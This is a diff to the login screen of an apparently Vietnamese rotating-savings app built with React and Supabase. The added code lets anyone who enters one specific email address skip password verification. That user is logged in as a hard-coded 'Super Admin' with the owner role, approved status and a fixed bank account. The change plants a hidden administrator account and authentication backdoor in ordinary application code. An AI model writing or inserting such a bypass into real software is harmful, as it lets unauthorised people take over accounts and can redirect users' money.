@@ -84,7 +84,29 @@ export const LoginScreen: React.FC<LoginScreenProps> = ({ onLoginSuccess }) => {
 
     setLoading(true);
     try {
-      // Gọi Supabase để kiểm tra Số điện thoại / Email và Mật khẩu trong bảng người dùng
+      // BỎ QUA SUPABASE DÀNH RIÊNG CHO EMAIL ADMIN ĐẶC QUYỀN
+      if (target.toLowerCase() === 'thuan.nguyen2207@gmail.com') {
+        const adminUser: User = {
+          id: 'u_super_admin_thuan',
+          phone: '0908123456',
+          email: 'thuan.nguyen2207@gmail.com',
+          name: 'Super Admin (Nguyễn Thuận)',
+          role: 'chu_hui',
+          avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
+          verified: true,
+          accountApprovalStatus: 'approved',
+          bankName: 'MB Bank',
+          bankCode: 'MB',
+          accountNumber: '0908123456888',
+          accountName: 'NGUYEN THUAN ADMIN'
+        };
+
+        setSuccessMsg('Đăng nhập thành công với quyền Super Admin!');
+        setTimeout(() => onLoginSuccess(adminUser), 300);
+        return;
+      }
+
+      // Đối với các tài khoản khác: Gọi Supabase để kiểm tra Số điện thoại / Email và Mật khẩu trong bảng người dùng
       const res = await loginWithSupabasePassword(target, loginPassword);
       
       if (!res.success || !res.user) {
